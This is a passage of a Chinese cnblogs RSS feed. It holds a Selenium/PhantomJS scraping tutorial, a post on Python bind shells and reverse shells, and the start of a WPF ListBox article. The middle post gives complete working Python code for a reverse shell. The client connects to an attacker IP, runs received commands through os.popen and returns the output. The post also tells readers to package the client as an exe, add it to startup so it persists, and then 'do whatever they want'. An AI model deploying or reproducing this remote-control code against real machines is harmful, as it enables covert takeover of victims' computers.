    browser.get(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;http://www.runoob.com/try/try.php?filename=jqueryui-api-droppable&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
    browser.switch_to.frame(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;iframssseResult&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)

&lt;/span&gt;&lt;span&gt;except&lt;/span&gt;&lt;span&gt; TimeoutException as e:
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(e)
&lt;/span&gt;&lt;span&gt;except&lt;/span&gt;&lt;span&gt; NoSuchFrameException as e:
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(e)
&lt;/span&gt;&lt;span&gt;finally&lt;/span&gt;&lt;span&gt;:
    browser.close()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　在这个示例中，我们可以把谷歌浏览器换成火狐等各种浏览器，用法是一样的&lt;/p&gt;
&lt;h2&gt;　　三、phantomJS无界面浏览器&lt;/h2&gt;
&lt;h3&gt;　　1，phantomJS介绍&lt;/h3&gt;
&lt;p&gt;　　上面用的谷歌浏览器是很好用的，而且可视化界面让学习者很好的了解整个过程，但其实在应用中，我们并不需要看到可视化界面，于是就有了phantomJS，它是一款无界面的浏览器，整个实现流程和谷歌一样的，虽然说没有界面，但其有截图功能，用save_screenshot函数&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;from&lt;/span&gt; selenium &lt;span&gt;import&lt;/span&gt;&lt;span&gt; webdriver
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; time
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; phantomjs路径&lt;/span&gt;
path = r&lt;span&gt;'&lt;/span&gt;&lt;span&gt;PhantomJS驱动路径&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;
browser &lt;/span&gt;=&lt;span&gt; webdriver.PhantomJS(path)
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 打开百度&lt;/span&gt;
url = &lt;span&gt;'&lt;/span&gt;&lt;span&gt;http://www.baidu.com/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;
browser.get(url)&lt;/span&gt;&lt;span&gt;
browser.save_screenshot(r&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;baidu.png&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 查找input输入框&lt;/span&gt;
my_input = browser.find_element_by_id(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;kw&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 往框里面写文字&lt;/span&gt;
my_input.send_keys(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;美女&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;截屏&lt;/span&gt;
browser.save_screenshot(r&lt;span&gt;'&lt;/span&gt;&lt;span&gt;meinv.png&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 查找搜索按钮&lt;/span&gt;
button = browser.find_elements_by_class_name(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;s_btn&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)[0]
button.click()&lt;/span&gt;&lt;span&gt;
browser.save_screenshot(r&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;show.png&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)&lt;/span&gt;&lt;span&gt;
browser.quit()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　用selenium和phantomJS就可以很友好的实现有些网页的爬取了，比如说需要把滚动条拉倒最下面才会有完整的页面。&lt;/p&gt;
&lt;h3&gt;　　2，爬取需要下拉动作的网页新闻&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;from&lt;/span&gt; selenium &lt;span&gt;import&lt;/span&gt;&lt;span&gt; webdriver
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; time &lt;span&gt;import&lt;/span&gt;&lt;span&gt; sleep
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; time

&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; &lt;span&gt;__name__&lt;/span&gt; == &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__main__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:
    url &lt;/span&gt;= &lt;span&gt;'https://news.163.com/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
    &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 发起请求前，可以让url表示的页面动态加载出更多的数据&lt;/span&gt;
    path = r&lt;span&gt;'&lt;/span&gt;&lt;span&gt;phantomjs-2.1.1-windows\bin\phantomjs.exe&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
    &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 创建无界面的浏览器对象&lt;/span&gt;
    bro =&lt;span&gt; webdriver.PhantomJS(path)
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 发起url请求&lt;/span&gt;
&lt;span&gt;    bro.get(url)&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 截图&lt;/span&gt;
    bro.save_screenshot(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;1.png&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 执行js代码（让滚动条向下偏移n个像素（作用：动态加载了更多的电影信息））&lt;/span&gt;
    js = &lt;span&gt;'&lt;/span&gt;&lt;span&gt;window.scrollTo(0,document.body.scrollHeight)&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;
    bro.execute_script(js)  &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 该函数可以执行一组字符串形式的js代码&lt;/span&gt;&lt;span&gt;
    bro.save_screenshot(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;2.png&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;) &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 使用爬虫程序爬去当前url中的内容 &lt;/span&gt;
    html_source = bro.page_source &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 该属性可以获取当前浏览器的当前页的源码（html） &lt;/span&gt;
    with open(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;./source.html&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;w&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, encoding=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;utf-8&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;) as fp: 
        fp.write(html_source) 
    bro.quit()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;　　四、谷歌无头浏览器&lt;/h2&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;from&lt;/span&gt; selenium &lt;span&gt;import&lt;/span&gt;&lt;span&gt; webdriver
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; selenium.webdriver.chrome.options &lt;span&gt;import&lt;/span&gt;&lt;span&gt; Options
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; time
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 创建一个参数对象，用来控制chrome以无界面模式打开&lt;/span&gt;
chrome_options =&lt;span&gt; Options()
chrome_options.add_argument(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;--headless&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
chrome_options.add_argument(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;--disable-gpu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 驱动路径&lt;/span&gt;
path = r&lt;span&gt;'&lt;/span&gt;&lt;span&gt;chromedriver.exe&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 创建浏览器对象&lt;/span&gt;
browser = webdriver.Chrome(executable_path=path, chrome_options=&lt;span&gt;chrome_options)
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 发送请求&lt;/span&gt;
url = &lt;span&gt;'&lt;/span&gt;&lt;span&gt;http://www.baidu.com/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;
browser.get(url)&lt;/span&gt;&lt;span&gt;
browser.save_screenshot(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;baidu.png&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
browser.quit()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　本篇博客主要借鉴于两位大佬，在此分享大佬的博客&lt;/p&gt;
&lt;p&gt;　　https://www.cnblogs.com/bobo-zhang/p/9685362.html&lt;/p&gt;
&lt;p&gt;　　https://www.cnblogs.com/pyedu/p/10306662.html&lt;/p&gt;
</description>
<pubDate>Mon, 04 Mar 2019 14:35:00 +0000</pubDate>
<dc:creator>W的一天</dc:creator>
<og:description>一、selenium模块 之前，我们爬虫是模拟浏览器，但始终不是用的浏览器，但今天我们要说的是另一种爬虫方式，这次不是模拟浏览器，而是用程序去控制浏览器进行一些列操作，也就是selenium。sele</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/12345huangchun/p/10473812.html</dc:identifier>
</item>
<item>
<title>python shell与反弹shell - 雨中落叶</title>
<link>http://www.cnblogs.com/yuzly/p/10473497.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/yuzly/p/10473497.html</guid>
<description>&lt;p&gt;&lt;span&gt;python shell与反弹shell&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;正常shell需要先在攻击端开机情况下开启程序,然后攻击端运行程序,才能连接&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;反弹shell,攻击端是服务端,被攻击端是客户端&lt;/span&gt;&lt;br/&gt;&lt;span&gt;正常shell,攻击端是客户端,被攻击端是服务端&lt;/span&gt; &lt;/p&gt;
&lt;p&gt;&lt;span&gt;反弹shell,先启用服务端,再启用客户端&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;em id=&quot;__mceDel&quot;&gt;&lt;span&gt;反弹shell的好处就是:一旦被攻击端开机,立即连接上攻击端(需要攻击端一直运行)&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;shell:&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;客户端：&lt;/span&gt;&lt;/span&gt;&lt;span&gt;&lt;span&gt;　&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; socket
s&lt;/span&gt;=&lt;span&gt;socket.socket()
s.connect((&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;192.168.0.114&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,1234))   &lt;span&gt;#&lt;/span&gt;&lt;span&gt;连接的服务器的ip地址,端口&lt;/span&gt;
&lt;span&gt;for&lt;/span&gt; i &lt;span&gt;in&lt;/span&gt; range(10&lt;span&gt;):
    com&lt;/span&gt;=input(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;command:&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
    s.send(com.encode())     &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;发送信息&lt;/span&gt;
    d=s.recv(1024)           &lt;span&gt;#&lt;/span&gt;&lt;span&gt;接受数据的大小&lt;/span&gt;
    &lt;span&gt;print&lt;/span&gt;(d.decode(),len(d))
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;服务端:　&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt;服务器端&lt;/span&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; socket
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; os
s&lt;/span&gt;=socket.socket()   &lt;span&gt;#&lt;/span&gt;&lt;span&gt;创建套接字 #s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)&lt;/span&gt;
&lt;span&gt;
s.bind((&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;0.0.0.0&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,1234))    &lt;span&gt;#&lt;/span&gt;&lt;span&gt;绑定地址和端口#0.0.0.0接收任意客户端ip连接&lt;/span&gt;
s.listen(5)                 &lt;span&gt;#&lt;/span&gt;&lt;span&gt;调用listen方法开始监听端口，传入的参数为等待连接的最大数量&lt;/span&gt;
con,addr=s.accept()     &lt;span&gt;#&lt;/span&gt;&lt;span&gt;接受一个客户端的连接&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt;print(con,addr)&lt;/span&gt;

&lt;span&gt;for&lt;/span&gt; i &lt;span&gt;in&lt;/span&gt; range(10&lt;span&gt;):
    cmd&lt;/span&gt;=con.recv(1024&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(cmd)
    command&lt;/span&gt;=&lt;span&gt;cmd.decode()
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; command.startswith(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;cd&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;):
        os.chdir(command[&lt;/span&gt;2:].strip())   &lt;span&gt;#&lt;/span&gt;&lt;span&gt;切换路径&lt;/span&gt;
        result=os.getcwd()      &lt;span&gt;#&lt;/span&gt;&lt;span&gt;显示路径&lt;/span&gt;
    &lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
        result&lt;/span&gt;=&lt;span&gt;os.popen(command).read()
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; result:
        con.send(result.encode())
    &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
        con.send(b&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;OK!&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;测试:（客户端(win10)、服务端(win7)）&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;1.把服务端打包成exe文件,然后在win7运行打包好的exe文件，python打包成exe文件这里推荐pyinstaller模块(需要安装,安装方法不会的百度)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;打包成exe文件时最好打包成文件夹，如何打包成单个exe文件,在win7中运行可能会出题。下图就是打包的文件夹,双击运行图中exe文件&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201903/1592114-20190304210919461-1034610988.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2.在win10运行客户端&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201903/1592114-20190304215457154-1547127468.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;反弹shell：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;客户端:&lt;/span&gt;　&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;49&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt;反弹shell,攻击端是服务端,被攻击端是客户端&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt;正常shell,攻击端是客户端,被攻击端是服务端&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt;例:攻击端(win10),被攻击端(win7),正常shell,先在win7启动服务端,再在win10启用客户端&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt;   反弹shell,先在win10启用服务端,再在win7启用客户端&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt;   反弹shell的好处就是:一旦被攻击端开机,立即连接上攻击端(需要攻击端一直运行)&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt;   正常shell需要先在攻击端开机情况下开启程序,然后攻击端运行程序,才能连接    &lt;/span&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; socket
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; os
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; sys
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; time
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;print(sys.argv)&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt;hacker=sys.argv[1]&lt;/span&gt;
hacker=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;192.168.0.144&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
port&lt;/span&gt;=1234&lt;span&gt;
server&lt;/span&gt;=&lt;span&gt;(hacker,port)
s&lt;/span&gt;=&lt;span&gt;socket.socket()
s.connect(server)

&lt;/span&gt;&lt;span&gt;while&lt;/span&gt; 1&lt;span&gt;:
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 得到被攻击端的所在目录，并发送&lt;/span&gt;
    dir=&lt;span&gt;os.getcwd()
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;print(dir)&lt;/span&gt;
&lt;span&gt;    s.send(dir.encode())
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 接收来自攻击端(服务器端)的命令，并进行处理&lt;/span&gt;
    cmd=s.recv(1024&lt;span&gt;).decode()
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 对接收的命令做出判断&lt;/span&gt;
    &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 退出&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; cmd==&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;exit&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;:
        &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;
    &lt;span&gt;elif&lt;/span&gt; cmd.startswith(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;cd&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;):
        os.chdir(cmd[&lt;/span&gt;2&lt;span&gt;:].strip())
        result&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;切换目录成功!&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
    &lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
        result&lt;/span&gt;=&lt;span&gt;os.popen(cmd).read()
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; &lt;span&gt;not&lt;/span&gt;&lt;span&gt; result:
        result&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;命令执行完毕!&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
    
    s.send(result.encode())
    time.sleep(&lt;/span&gt;1&lt;span&gt;)
    
s.close()
&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;退出!&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;)    
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;服务端:&lt;/span&gt;　&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; socket
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; time
server&lt;/span&gt;=(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;0.0.0.0&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,1234&lt;span&gt;)
s&lt;/span&gt;=&lt;span&gt;socket.socket()
s.bind(server)
s.listen(&lt;/span&gt;5&lt;span&gt;)
con,addr&lt;/span&gt;=&lt;span&gt;s.accept()
&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(addr,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;已经接入!&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;while&lt;/span&gt; 1&lt;span&gt;:
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;接收来自被攻击端的所在目录&lt;/span&gt;
    dir=con.recv(1024&lt;span&gt;).decode()
    cmd&lt;/span&gt;=input(dir+&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;).strip()
    con.send(cmd.encode())
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; cmd==&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;exit&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;:
        &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;
    result&lt;/span&gt;=con.recv(65365&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(result.decode())
    time.sleep(&lt;/span&gt;1&lt;span&gt;)
s.close()
&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;退出!&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;)    
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;测试:&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;1.先在win10运行反弹shell服务端&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2.再把反弹shell客户端打包成exe文件夹,复制到win7中，然后双击运行&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;3.这时可以看到服务端(win10)已经和客户端(win7)连接上了。#只要服务端一直运行，如果把客户端的程序加入到开机自启,这样客户端已开启就被连接到服务端　&lt;/span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201903/1592114-20190304214803343-699573742.jpg&quot; alt=&quot;&quot;/&gt;&lt;span&gt;&lt;span&gt;　&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; 4.接下就可以为所欲为了　&lt;/span&gt;　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201903/1592114-20190304215545134-1256220357.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 04 Mar 2019 13:58:00 +0000</pubDate>
<dc:creator>雨中落叶</dc:creator>
<og:description>python shell与反弹shell 正常shell需要先在攻击端开机情况下开启程序,然后攻击端运行程序,才能连接 反弹shell,攻击端是服务端,被攻击端是客户端正常shell,攻击端是客户端,</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/yuzly/p/10473497.html</dc:identifier>
</item>
<item>
<title>WPF开发为按钮提供添加，删除和重新排列ListBox内容的功能 - 九天飞翼</title>
<link>http://www.cnblogs.com/langda/p/10473467.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/langda/p/10473467.html</guid>
<description>&lt;h2&gt;&lt;span&gt;介绍&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;我有一种情况，我希望能够将项目添加到列表中，并在列表中移动项目，这似乎是使用a的最简单方法&lt;/span&gt;&lt;code&gt;ListBox&lt;/code&gt;&lt;span&gt;&lt;span&gt;。&lt;/span&gt;&lt;span&gt;我立刻想到了如何以通用的方式做到这一点，然后，也许，可以使用&lt;/span&gt;&lt;/span&gt;&lt;strong&gt;行为&lt;/strong&gt;&lt;span&gt;&lt;span&gt;来做到这一点。&lt;/span&gt;&lt;span&gt;这似乎是一个非常有用的想法。&lt;/span&gt;&lt;span&gt;我决定以一种简单的方式为我正在开发的应用程序做这件事，但我想我会创建一个演示项目来探索这个想法。&lt;/span&gt;&lt;span&gt;这是结果。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;&lt;span&gt;概观&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;该行为实际上有四个独立的部分，可以在一个类中执行不同的功能：&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;添加项目&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;将所选项目向上移动一个位置&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;将所选项目向下移动一个位置&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;删除所选项目。&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;span&gt;每个函数的代码结构非常相似，只有一些细节不同。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;将要检查的代码是&lt;/span&gt;&lt;strong&gt;Move Up&lt;/strong&gt;&lt;span&gt;&lt;span&gt;函数&lt;/span&gt;&lt;span&gt;的代码&lt;/span&gt;&lt;span&gt;。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;首先是以下定义&lt;/span&gt;&lt;code&gt;DependencyProperty&lt;/code&gt;&lt;span&gt;：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span id=&quot;prehide657447&quot;&gt;隐藏   &lt;span id=&quot;copycode657447&quot;&gt;复制代码&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;pre class=&quot;notranslate&quot; data-lang-guess=&quot;JavaScript&quot;&gt;
&lt;span class=&quot;code-keyword&quot;&gt;public &lt;span class=&quot;code-keyword&quot;&gt;static readonly DependencyProperty MoveItemUpProperty =
    DependencyProperty.RegisterAttached(&lt;span class=&quot;code-string&quot;&gt;&quot;&lt;span class=&quot;code-string&quot;&gt;MoveItemUp&quot;,
        &lt;span class=&quot;code-keyword&quot;&gt;typeof(Selector), &lt;span class=&quot;code-keyword&quot;&gt;typeof(ListHelperBehavior),
            &lt;span class=&quot;code-keyword&quot;&gt;new PropertyMetadata(&lt;span class=&quot;code-keyword&quot;&gt;null, OnMoveItemUpChanged));

&lt;span class=&quot;code-keyword&quot;&gt;public &lt;span class=&quot;code-keyword&quot;&gt;static Selector GetMoveItemUp(UIElement uiElement)
{ &lt;span class=&quot;code-keyword&quot;&gt;return (Selector)uiElement.GetValue(MoveItemUpProperty); }

&lt;span class=&quot;code-keyword&quot;&gt;public &lt;span class=&quot;code-keyword&quot;&gt;static &lt;span class=&quot;code-keyword&quot;&gt;void SetMoveItemUp(UIElement uiElement, Selector value)
{ uiElement.SetValue(MoveItemUpProperty, value); }
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;
